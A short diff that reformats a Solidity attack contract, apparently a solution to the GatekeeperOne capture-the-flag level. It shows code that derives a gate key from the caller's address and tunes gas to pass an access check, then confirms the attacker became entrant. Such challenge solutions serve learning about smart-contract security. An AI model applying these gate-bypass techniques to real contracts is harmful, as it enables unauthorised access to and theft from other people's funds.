@@ -12,9 +12,7 @@ contract GatekeeperOneAttack {
     }
 
     function attack() external {
-        bytes8 key = bytes8(
-            uint64(1 + type(uint32).max + uint16(uint160(msg.sender)))
-        );
+        bytes8 key = bytes8(uint64(1 + type(uint32).max + uint16(uint160(msg.sender))));
         uint256 mod = 8191;
         uint256 gasBase = 5 * mod;
         uint256 gasLimit = gasBase + mod;
@@ -37,9 +35,6 @@ contract GatekeeperOneAttack {
             }
         }
 
-        require(
-            msg.sender == victimGatekeeperOne.entrant(),
-            "GatekeeperOne: Attack failed"
-        );
+        require(msg.sender == victimGatekeeperOne.entrant(), "GatekeeperOne: Attack failed");
     }
 }
